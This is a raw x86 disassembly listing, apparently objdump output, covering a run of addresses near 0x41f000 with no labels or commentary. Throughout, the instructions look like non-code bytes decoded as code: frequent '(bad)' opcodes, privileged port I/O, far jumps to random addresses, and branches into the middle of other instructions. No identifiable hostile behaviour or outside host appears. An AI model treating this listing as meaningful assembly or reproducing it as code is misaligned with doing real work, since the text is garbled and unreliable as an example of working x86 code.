  41f033:	push   ds
  41f034:	add    DWORD PTR [ebp+0x1246d70f],ebx
  41f03a:	add    al,0xc8
  41f03c:	add    bh,0x1a
  41f03f:	ss jae 0x41f036
  41f042:	jmp    0x641543ea
  41f047:	mov    ebx,0xf0852210
  41f04c:	push   esp
  41f04d:	mov    DWORD PTR [edi+0x18],edi
  41f050:	popa   
  41f051:	mov    dl,0x48
  41f053:	or     edi,esi
  41f055:	clc    
  41f056:	fcom   QWORD PTR [ebx+eiz*2]
  41f059:	add    ch,BYTE PTR [edi+0x6d]
  41f05c:	jne    0x41f058
  41f05e:	mov    ds,WORD PTR [edx-0xe49c0e9]
  41f064:	mov    eax,0x1d8a1dad
  41f069:	in     eax,dx
  41f06a:	xchg   BYTE PTR [edx+0x6f2ad64f],al
  41f070:	inc    edx
  41f071:	es repz inc esp
  41f074:	cmp    al,0xd9
  41f076:	test   al,0x2e
  41f078:	add    al,0xa
  41f07a:	or     al,0x38
  41f07c:	in     eax,dx
  41f07d:	push   ds
  41f07e:	dec    esp
  41f07f:	push   ds
  41f080:	es jne 0x41f0e2
  41f083:	jp     0x41f0bc
  41f085:	int    0x93
  41f087:	aad    0x36
  41f089:	jnp    0x41f0f3
  41f08b:	lods   al,BYTE PTR ds:[esi]
  41f08c:	shr    ah,1
  41f08e:	pop    edi
  41f08f:	test   eax,0x1e5a4918
  41f094:	mov    ds:0xcf23f87,eax
  41f099:	jns    0x41f0cb
  41f09b:	mov    edx,0x4aefad87
  41f0a0:	out    dx,al
  41f0a1:	inc    edx
  41f0a2:	rol    BYTE PTR [esi+eax*1-0x670140a0],0xa6
  41f0aa:	bound  ecx,QWORD PTR [edx+ecx*4+0x60]
  41f0ae:	or     al,0xd1
  41f0b0:	push   cs
  41f0b1:	mov    bl,0x74
  41f0b3:	das    
  41f0b4:	mov    eax,ds:0x23c8164
  41f0b9:	lods   al,BYTE PTR ds:[esi]
  41f0ba:	ss cmp eax,ebp
  41f0bd:	ja     0x41f063
  41f0bf:	push   ss
  41f0c0:	mov    ah,0x67
  41f0c2:	out    0x81,eax
  41f0c4:	inc    ebx
  41f0c5:	push   cs
  41f0c6:	mov    BYTE PTR [ebp-0x7304db2c],dl
  41f0cc:	jmp    0x1b9e276b
  41f0d1:	sub    eax,0x1ef95b00
  41f0d6:	in     eax,0x94
  41f0d8:	add    BYTE PTR [edx],bl
  41f0da:	enter  0xddd4,0xbd
  41f0de:	push   ss
  41f0df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0e0:	ja     0x41f0ac
  41f0e2:	sbb    eax,0x3bc48f71
  41f0e7:	stos   DWORD PTR es:[edi],eax
  41f0e8:	jno    0x41f0c3
  41f0ea:	nop
  41f0eb:	or     cx,sp
  41f0ee:	mov    eax,ds:0x90254d8a
  41f0f3:	mov    esi,0xde6899e3
  41f0f8:	xor    eax,0x89a03a9d
  41f0fd:	push   es
  41f0fe:	push   ebp
  41f0ff:	test   al,0x5f
  41f101:	xor    eax,0x7f2faf6
  41f106:	call   0x2cef45b2
  41f10b:	add    BYTE PTR [ebp+0x14],0xcf
  41f10f:	cld    
  41f110:	sub    edx,DWORD PTR ds:0xd5ec34bf
  41f116:	in     al,0xb2
  41f118:	(bad)  
  41f119:	fldcw  WORD PTR [esi]
  41f11b:	fsubr  QWORD PTR [edi+eiz*4]
  41f11e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f11f:	adc    al,0x2b
  41f121:	or     cl,ah
  41f123:	out    0xf5,al
  41f125:	jns    0x41f17b
  41f127:	sub    al,0x4b
  41f129:	sti    
  41f12a:	cmp    BYTE PTR [edi+eiz*1+0x40],0x5
  41f12f:	or     bl,cl
  41f131:	call   0x5b2e:0x8bd81bcc
  41f138:	es repz scas al,BYTE PTR es:[edi]
  41f13b:	lahf   
  41f13c:	rol    DWORD PTR [edi+0x47],1
  41f13f:	mov    eax,0x10d396ea
  41f144:	sbb    ebp,DWORD PTR [edx+eiz*2]
  41f147:	stos   DWORD PTR es:[edi],eax
  41f148:	pop    esi
  41f149:	arpl   dx,sp
  41f14b:	popa   
  41f14c:	cmp    eax,0xae4f6b6b
  41f151:	neg    DWORD PTR [ebx-0x110d64b7]
  41f157:	and    BYTE PTR [ecx-0xb096bdc],bl
  41f15d:	sbb    eax,0x4dd49fe2
  41f162:	jg     0x41f16d
  41f164:	mov    esp,0x326d753d
  41f169:	repnz mov esi,0x5b7ae762
  41f16f:	xchg   BYTE PTR [esi+esi*2],dh
  41f172:	cmp    BYTE PTR [edx-0x77],bh
  41f175:	scas   eax,DWORD PTR es:[edi]
  41f176:	rcr    DWORD PTR [eax],1
  41f178:	les    esi,FWORD PTR [ebx+0x6a9f38a5]
  41f17e:	add    ch,0x0
  41f181:	adc    ch,dh
  41f183:	adc    al,0xeb
  41f185:	sahf   
  41f186:	arpl   WORD PTR [edx-0x819cd16],bp
  41f18c:	inc    ebp
  41f18d:	xlat   BYTE PTR ds:[ebx]
  41f18e:	es aad 0xdb
  41f191:	retf   0x9103
  41f194:	add    eax,0xba1adf5a
  41f199:	sbb    ecx,DWORD PTR [edi-0x4d]
  41f19c:	inc    ecx
  41f19d:	fisubr DWORD PTR [eax]
  41f19f:	sti    
  41f1a0:	ror    DWORD PTR [ebp-0x52],cl
  41f1a3:	or     DWORD PTR [ebx+0x22],edx
  41f1a6:	sbb    BYTE PTR [ebx+0x28],0xce
  41f1aa:	fs adc BYTE PTR ds:[eax+ebp*4-0x58],0x7e
  41f1b1:	lods   al,BYTE PTR ds:[esi]
  41f1b2:	sub    eax,0x5f26bf43
  41f1b7:	and    eax,0x8a332a1f
  41f1bc:	cmp    DWORD PTR [ebp+0x7c27c4fe],ebp
  41f1c2:	mov    esp,0xe295a277
  41f1c7:	sbb    DWORD PTR [esi-0x4d6eb59f],edi
  41f1cd:	test   eax,0xe9900317
  41f1d2:	mov    cl,0xf0
  41f1d4:	stos   DWORD PTR es:[edi],eax
  41f1d5:	mov    ecx,0xd0912c2c
  41f1da:	push   cs
  41f1db:	push   esi
  41f1dc:	mov    ds:0xce1de620,al
  41f1e1:	shl    ebx,1
  41f1e3:	and    ah,BYTE PTR [edx]
  41f1e5:	pop    edi
  41f1e6:	lods   eax,DWORD PTR ds:[esi]
  41f1e7:	xchg   DWORD PTR [ecx-0x2a],edx
  41f1ea:	int3   
  41f1eb:	test   DWORD PTR [ebx+0x76],ecx
  41f1ee:	in     al,0xba
  41f1f0:	(bad)  
  41f1f1:	cdq    
  41f1f2:	jl     0x41f184
  41f1f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1f5:	loop   0x41f1d5
  41f1f7:	mov    al,ds:0x7cae74ed
  41f1fc:	mov    al,ds:0x57c620e
  41f201:	test   DWORD PTR [eax],edx
  41f203:	adc    DWORD PTR [ebp-0x7e9026f6],esp
  41f209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f20a:	imul   ecx,DWORD PTR [edi-0x4a],0x96ad4ee9
  41f211:	inc    edi
  41f212:	push   cs
  41f213:	ror    BYTE PTR [edi],cl
  41f215:	cmp    cl,ch
  41f217:	das    
  41f218:	sbb    ah,ah
  41f21a:	imul   ebp,eax,0xffffffae
  41f21d:	adc    cl,BYTE PTR [ebx+0x66]
  41f220:	mov    ?,WORD PTR [edi-0x2]
  41f223:	(bad)  [esi]
  41f225:	pcmpeqd mm6,QWORD PTR [ebx]
  41f228:	lds    esp,FWORD PTR [eax]
  41f22a:	call   0x22b94093
  41f22f:	lock enter 0xfc50,0xd6
  41f234:	inc    eax
  41f235:	jle    0x41f247
  41f237:	aam    0x47
  41f239:	cmp    eax,DWORD PTR [esi]
  41f23b:	leave  
  41f23c:	cmp    eax,0xea098d3e
  41f241:	sbb    dl,BYTE PTR [esi-0x55]
  41f244:	das    
  41f245:	les    ecx,FWORD PTR [edi+0x72]
  41f248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f249:	push   esp
  41f24a:	mov    DWORD PTR [edi-0x2d],ebp
  41f24d:	push   0x30
  41f24f:	(bad)  
  41f250:	stos   DWORD PTR es:[edi],eax
  41f251:	cmp    al,0xeb
  41f253:	jl     0x41f2b0
  41f255:	ficomp WORD PTR [ebx-0x6f3b20fc]
  41f25b:	jae    0x41f270
  41f25d:	scas   eax,DWORD PTR es:[edi]
  41f25e:	add    eax,0x8cfa76e6
  41f263:	fisttp DWORD PTR [ebp+0x29212516]
  41f269:	mov    al,0xb2
  41f26b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f26c:	stc    
  41f26d:	arpl   WORD PTR [edi],si
  41f26f:	enter  0x7589,0x4a
  41f273:	pushf  
  41f274:	xchg   ebx,eax
  41f275:	mov    eax,ds:0x469686bb
  41f27a:	cld    
  41f27b:	inc    ecx
  41f27c:	pop    ds
  41f27d:	push   0x8b7dea0e
  41f282:	fimul  DWORD PTR [ebx-0x5e6bc2e0]
  41f288:	rol    DWORD PTR [edx-0x55bd1854],1
  41f28e:	xchg   esp,eax
  41f28f:	js     0x41f24c
  41f291:	dec    edi
  41f292:	xchg   ebp,eax
  41f293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f294:	mov    ebx,0xa81b38a8
  41f299:	jae    0x41f24e
  41f29b:	ins    BYTE PTR es:[edi],dx
  41f29c:	hlt    
  41f29d:	or     bh,BYTE PTR [edi+0x34ac42ca]
  41f2a3:	dec    ebp
  41f2a5:	cli    
  41f2a6:	(bad)  
  41f2a7:	sub    eax,0x28e0b5d2
  41f2ac:	in     al,dx
  41f2ad:	mov    eax,0xb09eb37
  41f2b2:	cwde   
  41f2b3:	adc    DWORD PTR [edx-0x26],ebx
  41f2b6:	outs   dx,DWORD PTR ds:[esi]
  41f2b7:	mov    DWORD PTR [edx],esi
  41f2b9:	popf   
  41f2ba:	jb     0x41f2fc
  41f2bc:	fwait
  41f2bd:	loopne 0x41f259
  41f2bf:	in     al,0x1
  41f2c1:	shr    cl,1
  41f2c3:	sub    eax,0x42936c41
  41f2c8:	pop    ebx
  41f2c9:	jmp    0x5e2c:0x6fca83fb
  41f2d0:	repnz cmp al,0x7c
  41f2d3:	or     DWORD PTR [ebp+0x58],ecx
  41f2d6:	fst    QWORD PTR [edx]
  41f2d8:	xchg   edi,eax
  41f2d9:	in     al,dx
  41f2da:	js     0x41f332
  41f2dc:	fnstsw WORD PTR [ebx]
  41f2de:	fnstcw WORD PTR [esi+0xd3f4c7b]
  41f2e4:	xor    al,0x78
  41f2e6:	mov    dh,0x94
  41f2e8:	adc    DWORD PTR [eax+0x58eb614f],0x74
  41f2ef:	leave  
  41f2f0:	pusha  
  41f2f1:	daa    
  41f2f2:	sahf   
  41f2f3:	sbb    ebp,DWORD PTR [esi-0x73]
  41f2f6:	xchg   esi,eax
  41f2f7:	sti    
  41f2f8:	test   BYTE PTR [edi+ecx*2+0x287e0bdc],ch
  41f2ff:	inc    esi
  41f300:	sbb    eax,0xac18eaaa
  41f305:	adc    BYTE PTR [ebp+0x17],bl
  41f308:	ds arpl cx,bx
  41f30b:	(bad)  
  41f30c:	repz sub cl,BYTE PTR [ebp+0x6d70fd06]
  41f313:	mov    bh,0xef
  41f315:	mov    dh,dl
  41f317:	mov    dh,0xe0
  41f319:	mov    es,WORD PTR [edi-0x11]
  41f31c:	cmp    dl,bh
  41f31e:	scas   eax,DWORD PTR es:[edi]
  41f31f:	clc    
  41f320:	fst    DWORD PTR [ebp+0x2d]
  41f323:	or     BYTE PTR [ebx-0x72ddb7f],dl
  41f329:	push   ecx
  41f32a:	push   eax
  41f32b:	iret   
  41f32c:	adc    edx,edi
  41f32e:	xchg   ecx,eax
  41f32f:	(bad)  
  41f331:	fcmovu st,st(0)
  41f333:	cmp    bl,BYTE PTR [ebp+0x2c]
  41f336:	xor    al,0x1c
  41f338:	sbb    BYTE PTR [edi+0x4b2b1424],al
  41f33e:	jmp    0x41f33c
  41f340:	jmp    0xba1663af
  41f345:	mov    BYTE PTR [eax],ah
  41f347:	arpl   WORD PTR [eax+0x218da73b],si
  41f34d:	imul   edx,ebp,0x2e
  41f350:	fxch   st(4)
  41f352:	sub    eax,0xffffffd9
  41f355:	js     0x41f356
  41f357:	jmp    0x4e83:0x835fdb1f
  41f35e:	cld    
  41f35f:	sbb    eax,0x28b4774e
  41f364:	inc    edx
  41f365:	out    0xdf,al
  41f367:	and    bl,BYTE PTR [ecx-0x20]
  41f36a:	push   es
  41f36b:	gs loope 0x41f2f4
  41f36e:	fcmovbe st,st(0)
  41f370:	fcomp  QWORD PTR [esi-0x195b5dde]
  41f376:	push   cs
  41f377:	int    0xb1
  41f379:	cmp    eax,0x90d806eb
  41f37e:	add    ecx,DWORD PTR [ebx]
  41f380:	imul   ecx,DWORD PTR [edx-0x78634957],0xa0290998
  41f38a:	inc    ecx
  41f38b:	fldenv [ebx+0x234d81bc]
  41f391:	int3   
  41f392:	add    al,0x1c
  41f394:	jge    0x41f358
  41f396:	cdq    
  41f397:	stos   BYTE PTR es:[edi],al
  41f398:	or     esi,DWORD PTR [ebp+0x67073d13]
  41f39e:	xchg   esp,eax
  41f39f:	mov    bl,0xe1
  41f3a1:	les    edi,FWORD PTR [edi]
  41f3a3:	sub    DWORD PTR [ebp+edx*1+0xa],0xfffffffb
  41f3a8:	aaa    
  41f3a9:	pop    es
  41f3aa:	imul   al
  41f3ac:	or     al,0xbb
  41f3ae:	xchg   esi,eax
  41f3af:	rcr    DWORD PTR [esi+ebp*1],1
  41f3b2:	jle    0x41f37b
  41f3b4:	fbstp  TBYTE PTR [esi-0x5c]
  41f3b7:	pop    eax
  41f3b8:	lock stc 
  41f3ba:	shl    BYTE PTR [eax+esi*2],1
  41f3bd:	sbb    eax,eax
  41f3bf:	ret    
  41f3c0:	nop
  41f3c1:	repz add al,0x1b
  41f3c4:	mov    eax,ds:0xb26830a9
  41f3c9:	sub    dh,BYTE PTR [edi-0x6b]
  41f3cc:	ret    0xca7b
  41f3cf:	mov    esp,es
  41f3d1:	cmp    eax,0x5f6c9a5c
  41f3d6:	imul   ebx,DWORD PTR [edx+0x35],0xffffff81
  41f3da:	in     eax,dx
  41f3db:	loope  0x41f3ad
  41f3dd:	fbld   TBYTE PTR [esi-0x6e]
  41f3e0:	retf   0xc3a1
  41f3e3:	xor    DWORD PTR [edi-0xece5f3b],ecx
  41f3e9:	mov    ds:0x4960fa78,eax
  41f3ee:	bound  ebp,QWORD PTR [ebp+0x61]
  41f3f1:	xor    eax,0x3ed54f41
  41f3f6:	imul   ebp,esp,0xffffffbb
  41f3f9:	mov    WORD PTR [ecx+0x75],es
  41f3fc:	ins    BYTE PTR es:[edi],dx
  41f3fd:	mov    al,ds:0x4fc0fb40
  41f402:	xor    DWORD PTR [ebx+eiz*2+0x2d],ecx
  41f406:	sub    ah,cl
  41f408:	inc    eax
  41f409:	xor    al,0x70
  41f40b:	in     al,0x23
  41f40d:	dec    esp
  41f40e:	mov    dl,0x21
  41f410:	xchg   ebx,eax
  41f411:	push   esi
  41f412:	ficomp WORD PTR [ecx+0x10866916]
  41f418:	xor    dl,BYTE PTR [esi+0x1d]
  41f41b:	(bad)  
  41f41c:	sbb    eax,esi
  41f41e:	imul   esi,DWORD PTR [eax],0x21
  41f421:	jmp    0x10533f1f
  41f426:	pop    ebx
  41f427:	sti    
  41f428:	mov    bl,0xd5
  41f42a:	mov    ebx,0xd9cc2c4a
  41f42f:	das    
  41f430:	jge    0x41f497
  41f432:	test   BYTE PTR [edx-0x22],bl
  41f435:	adc    eax,0x6e57e729
  41f43a:	mov    dh,0x9d
  41f43c:	adc    DWORD PTR [edi],esi
  41f43e:	lds    ecx,FWORD PTR [eax]
  41f440:	adc    DWORD PTR [edx],0xffffffed
  41f443:	or     edx,DWORD PTR [edx-0x54]
  41f446:	stos   BYTE PTR es:[edi],al
  41f447:	mov    eax,0xbc9694f2
  41f44c:	mov    DWORD PTR [esp+ebp*1],ecx
  41f44f:	retf   0x4f5a
  41f452:	bndldx bnd3,[esi+0x7a5245a2]
  41f459:	inc    esi
  41f45a:	popf   
  41f45b:	mov    edx,0x2e5ef563
  41f460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f461:	pop    ebp
  41f462:	mov    ss,WORD PTR [ebx-0x35c3dc75]
  41f468:	mov    BYTE PTR [esi-0x2],dh
  41f46b:	adc    eax,0xb5baf43c
  41f470:	cwde   
  41f471:	sub    ebx,DWORD PTR [ebp+0x3f73f0aa]
  41f477:	test   DWORD PTR [esi-0x79287c9e],ecx
  41f47d:	test   eax,0xa203bfd3
  41f482:	jl     0x41f4e2
  41f484:	push   edi
  41f485:	xor    al,0xce
  41f487:	xor    DWORD PTR [eax-0x3d],ebp
  41f48a:	xchg   esi,eax
  41f48b:	and    esi,DWORD PTR cs:[ebp-0x43e7c2a6]
  41f492:	mov    ch,0x5d
  41f494:	fadd   st,st(6)
  41f496:	xor    bh,BYTE PTR [ebp-0x5f806b22]
  41f49c:	pop    ecx
  41f49d:	mov    ah,0x3e
  41f49f:	xor    BYTE PTR [eax],bh
  41f4a1:	sub    BYTE PTR [esi-0x4eb68b87],ah
  41f4a7:	dec    edi
  41f4a8:	adc    BYTE PTR [ecx+edi*1+0x5],cl
  41f4ac:	test   DWORD PTR [esi-0x3b],ebx
  41f4af:	adc    DWORD PTR [esp+ebp*2],ebp
  41f4b2:	jnp    0x41f527
  41f4b4:	push   esp
  41f4b5:	in     al,0x41
  41f4b7:	ins    BYTE PTR es:[edi],dx
  41f4b8:	push   es
  41f4b9:	push   eax
  41f4ba:	sub    eax,0x26f30523
  41f4bf:	shr    cl,1
  41f4c1:	das    
  41f4c2:	aam    0x3a
  41f4c4:	out    dx,eax
  41f4c5:	vorps  ymm3,ymm0,YMMWORD PTR [ebx]
  41f4ca:	in     eax,dx
  41f4cb:	sti    
  41f4cc:	not    BYTE PTR [edi]
  41f4ce:	call   0x9ea1:0xce66cb69
  41f4d5:	pusha  
  41f4d6:	mov    bl,0x48
  41f4d8:	lods   eax,DWORD PTR ds:[esi]
  41f4d9:	xchg   esp,eax
  41f4da:	sub    BYTE PTR ds:0xd2b38f48,bl
  41f4e1:	adc    BYTE PTR [ebp-0x2e],dh
  41f4e4:	add    al,0xfc
  41f4e6:	sbb    BYTE PTR [edi],0xfe
  41f4e9:	out    dx,eax
  41f4ea:	xchg   edx,eax
  41f4eb:	pop    eax
  41f4ec:	aas    
  41f4ed:	ud1    edi,ebp
  41f4f0:	addr16 fldz 
  41f4f3:	in     al,dx
  41f4f4:	xor    ebx,edx
  41f4f6:	es lds ecx,FWORD PTR ss:[esi]
  41f4fa:	mov    eax,ds:0x46382aa8
  41f4ff:	cmp    DWORD PTR [edi],edi
  41f501:	jno    0x41f57d
  41f503:	inc    edx
  41f504:	fisubr WORD PTR [esi+0x49]
  41f507:	pop    ss
  41f508:	test   DWORD PTR [edx+0x50],0x2ad1646a
  41f50f:	pop    esp
  41f510:	data16 scas al,BYTE PTR es:[edi]
  41f512:	cwde   
  41f513:	cwde   
  41f514:	mov    ecx,ebp
  41f516:	mov    edx,0xc9bfe7d1
  41f51b:	fadd   st,st(6)
  41f51d:	add    al,0x5f
  41f51f:	pop    edx
  41f520:	xchg   ebx,eax
  41f521:	sub    DWORD PTR [edi],eax
  41f523:	push   ss
  41f524:	jne    0x41f578
  41f526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f527:	mov    bh,0xc5
  41f529:	cs dec edi
  41f52b:	jle    0x41f506
  41f52d:	jnp    0x41f4b9
  41f52f:	test   eax,0x25f577fa
  41f534:	xor    dh,bl
  41f536:	mul    DWORD PTR [esi+0x33fcb8a2]
  41f53c:	adc    al,0xaf
  41f53e:	and    bh,BYTE PTR [ebp-0x3d]
  41f541:	push   eax
  41f542:	xchg   edi,eax
  41f543:	mov    esi,DWORD PTR ds:0x7983df93
  41f549:	jne    0x41f4cf
  41f54b:	xor    DWORD PTR [ecx+0x9],esp
  41f54e:	jmp    0x2b14:0x215be947
  41f555:	add    al,0x7e
  41f557:	in     eax,dx
  41f558:	mov    cl,0xfe
  41f55a:	ss popf 
  41f55c:	xchg   ebp,eax
  41f55d:	ret    
  41f55e:	das    
  41f55f:	mov    al,0x8f
  41f561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f562:	inc    ebx
  41f563:	imul   DWORD PTR [ebp-0x7e]
  41f566:	out    0x52,al
  41f568:	jae    0x41f5c0
  41f56a:	add    ah,BYTE PTR [ebx+0x31]
  41f56d:	sub    al,0x6d
  41f56f:	aas    
  41f570:	(bad)  
  41f571:	push   eax
  41f572:	pop    ebp
  41f573:	ss inc edi
  41f575:	cdq    
  41f576:	cld    
  41f577:	shl    BYTE PTR [ebp-0x61],1
  41f57a:	das    
  41f57b:	ror    DWORD PTR fs:[ebp-0x9],cl
  41f57f:	dec    esi
  41f580:	xor    dh,bl
  41f582:	adc    al,0x9d
  41f584:	lock aad 0x76
  41f587:	jp     0x41f576
  41f589:	iret   
  41f58a:	outs   dx,BYTE PTR ds:[esi]
  41f58b:	push   esp
  41f58c:	mov    ecx,0x33278b4a
  41f591:	inc    ebx
  41f592:	add    bh,ch
  41f594:	or     ebx,ebp
  41f596:	jl     0x41f554
  41f598:	xchg   ecx,eax
  41f599:	in     eax,0x63
  41f59b:	iret   
  41f59c:	popf   
  41f59d:	sub    eax,0xabb93f29
  41f5a2:	data16 adc cl,BYTE PTR [esi-0x426f1ded]
  41f5a9:	test   eax,0x2fe486c
  41f5ae:	mov    ds:0xbee8ac94,al
  41f5b3:	out    dx,al
  41f5b4:	cwde   
  41f5b5:	push   edi
  41f5b6:	and    bl,BYTE PTR [edx+0x4d]
  41f5b9:	out    0x83,eax
  41f5bb:	mov    ecx,0x56ecc1e8
  41f5c0:	scas   al,BYTE PTR es:[edi]
  41f5c1:	inc    eax
  41f5c2:	imul   ebx,DWORD PTR ds:0x4f3979bd,0x26
  41f5c9:	lahf   
  41f5ca:	mov    eax,ds:0xd8fcc199
  41f5cf:	repz xchg esi,eax
  41f5d1:	mov    ebx,0xb340af84
  41f5d6:	cwde   
  41f5d7:	lods   al,BYTE PTR ds:[esi]
  41f5d8:	int3   
  41f5d9:	ss cmp al,0x9c
  41f5dc:	add    BYTE PTR [esi],0xf0
  41f5df:	xor    al,0x8c
  41f5e1:	outs   dx,DWORD PTR ds:[esi]
  41f5e2:	and    ebx,DWORD PTR [edi+0x20]
  41f5e5:	test   eax,0xfc229db9
  41f5ea:	xchg   esp,eax
  41f5eb:	add    esi,ebp
  41f5ed:	adc    DWORD PTR [edx+0x662b1860],ecx
  41f5f3:	ins    DWORD PTR es:[edi],dx
  41f5f4:	mov    ebp,0xd99bebe5
  41f5f9:	adc    eax,0x994f3776
  41f5fe:	fdivp  st(3),st
  41f600:	dec    esp
  41f601:	xchg   ecx,eax
  41f602:	add    DWORD PTR [ecx],edx
  41f604:	jmp    0x41f64e
  41f606:	adc    al,0x68
  41f608:	into   
  41f609:	add    esi,ebx
  41f60b:	xor    DWORD PTR [edi+ecx*8-0x695a38f6],eax
  41f612:	adc    BYTE PTR [edi-0x69],dl
  41f615:	(bad)  
  41f616:	int    0xf
  41f618:	push   edi
  41f619:	loopne 0x41f64f
  41f61b:	inc    ebp
  41f61c:	mov    ds:0x7240414a,al
  41f621:	fisttp WORD PTR [eax-0x3172563d]
  41f627:	mov    ecx,0x86c39464
  41f62c:	mov    bl,0x1d
  41f62e:	sub    eax,0x84b144c3
  41f633:	xchg   edx,eax
  41f634:	idiv   BYTE PTR [esi]
  41f636:	xchg   edi,eax
  41f637:	(bad)  
  41f63a:	aas    
  41f63b:	adc    ch,ah
  41f63d:	mov    esp,0x1b974f00
  41f642:	adc    esi,DWORD PTR [edx+eiz*2+0x5f4e798f]
  41f649:	fs pop ebx
  41f64b:	mov    ebx,0xcd47126
  41f650:	add    ebp,DWORD PTR [ecx]
  41f652:	mov    edi,0x75ad9d82
  41f657:	out    0xe7,al
  41f659:	rcr    DWORD PTR [ecx],0x2e
  41f65c:	fadd   DWORD PTR [ebp+0x41]
  41f65f:	push   ebp
  41f660:	mov    cl,0x85
  41f662:	mov    ebp,DWORD PTR [eax]
  41f664:	dec    edx
  41f665:	and    ch,cl
  41f667:	das    
  41f668:	or     dl,BYTE PTR [edx-0x684f6bad]
  41f66e:	jmp    DWORD PTR [ecx+0x23e1a6d0]
  41f674:	into   
  41f675:	ss inc edi
  41f677:	add    cl,BYTE PTR [esi-0x1abd9e66]
  41f67d:	(bad)
  41f680:	daa    
  41f681:	cmp    al,bh
  41f683:	jmp    0x781:0x21cad178
  41f68a:	inc    eax
  41f68b:	cld    
  41f68c:	mov    edx,0x557a937e
  41f691:	push   ss
  41f692:	adc    al,0x71
  41f694:	xchg   esi,eax
  41f695:	leave  
  41f696:	out    dx,eax
  41f697:	fisubr DWORD PTR [edi-0x46]
  41f69a:	push   edi
  41f69b:	xchg   ecx,eax
  41f69c:	xchg   esi,eax
  41f69d:	cdq    
  41f69e:	or     ecx,DWORD PTR [edi+0x153c978e]
  41f6a4:	nop
  41f6a5:	pop    ebp
  41f6a6:	xchg   ebp,eax
  41f6a7:	or     eax,0x29449593
  41f6ac:	jbe    0x41f656
  41f6ae:	and    edi,eax
  41f6b0:	scas   eax,DWORD PTR es:[edi]
  41f6b1:	push   0xbd85836c
  41f6b6:	les    edx,FWORD PTR [edx-0x35]
  41f6b9:	xchg   edi,eax
  41f6ba:	in     eax,dx
  41f6bb:	rcr    BYTE PTR [edi],1
  41f6bd:	cmp    bh,BYTE PTR [edx-0x57]
  41f6c0:	test   eax,0xee48ba0f
  41f6c5:	(bad)  
  41f6c6:	cmp    edx,DWORD PTR [edi]
  41f6c8:	(bad)  
  41f6c9:	iret   
  41f6ca:	in     eax,dx
  41f6cb:	lahf   
  41f6cc:	lea    ebp,[esi+0x43c5fc6e]
  41f6d2:	push   edi
  41f6d3:	mov    edx,0xbf36625d
  41f6d8:	add    esp,DWORD PTR [ecx]
  41f6da:	outs   dx,DWORD PTR ds:[esi]
  41f6db:	js     0x41f74a
  41f6dd:	fst    QWORD PTR [ebp+0x8]
  41f6e0:	dec    esi
  41f6e1:	jns    0x41f69d
  41f6e3:	ja     0x41f6bd
  41f6e5:	adc    DWORD PTR [ecx-0x1db785a4],ecx
  41f6eb:	sahf   
  41f6ec:	inc    ebx
  41f6ed:	mov    eax,0x39efea69
  41f6f2:	pop    ecx
  41f6f3:	jo     0x41f6b7
  41f6f5:	repz or al,0xd8
  41f6f8:	xchg   DWORD PTR [edi-0x2e012f3b],ebx
  41f6fe:	dec    edx
  41f6ff:	sub    al,BYTE PTR [ebp+0x1a]
  41f702:	call   0xe0a0:0xeface76
  41f709:	sub    dh,BYTE PTR ds:0x638a4958
  41f70f:	mul    DWORD PTR [ebp+0x16]
  41f712:	push   edi
  41f713:	xchg   ebx,eax
  41f714:	popa   
  41f715:	jae    0x41f77e
  41f717:	popf   
  41f718:	mov    edi,0x26080d4
  41f71d:	adc    DWORD PTR ds:0x9cbf50a,edi
  41f723:	pop    ebp
  41f724:	adc    ebp,esp
  41f726:	stc    
  41f727:	jl     0x41f6d5
  41f729:	and    ah,BYTE PTR [esp+edi*4-0x61ff8fa6]
  41f730:	adc    BYTE PTR [esi],ah
  41f732:	push   esp
  41f733:	dec    eax
  41f734:	mov    WORD PTR [eax+edi*8-0x45],gs
  41f738:	push   es
  41f739:	dec    ecx
  41f73a:	fdivr  st,st(4)
  41f73c:	(bad)  
  41f73d:	scas   al,BYTE PTR es:[edi]
  41f73e:	sub    esp,ebx
  41f740:	retf   
  41f741:	add    edi,DWORD PTR [ebp+0x16]
  41f744:	pusha  
  41f745:	inc    ebp
  41f746:	test   DWORD PTR [ebx],0xc6272792
  41f74c:	xlat   BYTE PTR ds:[ebx]
  41f74d:	dec    esi
  41f74e:	in     eax,dx
  41f74f:	test   DWORD PTR [ebx-0x3b],0x50e7f09c
  41f756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f757:	sub    al,dl
  41f759:	enter  0xed47,0x1e
  41f75d:	xor    al,0xc5
  41f75f:	rcr    DWORD PTR [ecx],1
  41f761:	rcr    BYTE PTR [eax-0x1e32b384],0xb8
  41f768:	sahf   
  41f769:	sbb    dh,al
  41f76b:	xchg   ebp,eax
  41f76c:	mov    eax,0x3f849173
  41f771:	jp     0x41f7a5
  41f773:	mov    ecx,0x3ceee714
  41f778:	sar    BYTE PTR [edx-0x65],1
  41f77b:	wbinvd 
  41f77d:	and    eax,0x77002f7d
  41f782:	mov    al,ds:0x17819bf3
  41f787:	mov    esp,0xcad9697b
  41f78c:	loope  0x41f749
  41f78e:	and    al,bl
  41f790:	cdq    
  41f791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f792:	sahf   
  41f793:	and    eax,0x24019070
  41f798:	adc    eax,0x93152d9c
  41f79d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f79e:	mov    cl,0x22
  41f7a0:	mov    edx,0xf364f115
  41f7a5:	(bad)  
  41f7a6:	popf   
  41f7a7:	mov    bh,0x52
  41f7a9:	in     eax,0x35
  41f7ab:	mov    bl,0x57
  41f7ad:	adc    eax,0xd6556770
  41f7b2:	or     ecx,DWORD PTR gs:[eax]
  41f7b5:	call   0x1e51d822
  41f7ba:	aaa    
  41f7bb:	ret    0x387e
  41f7be:	pop    esp
  41f7bf:	push   0x3e04291e
  41f7c4:	in     al,0xc4
  41f7c6:	pop    esi
  41f7c7:	enter  0x48d0,0x12
  41f7cb:	push   ebp
  41f7cc:	lds    esp,FWORD PTR [ecx+0x2de2f112]
  41f7d2:	lahf   
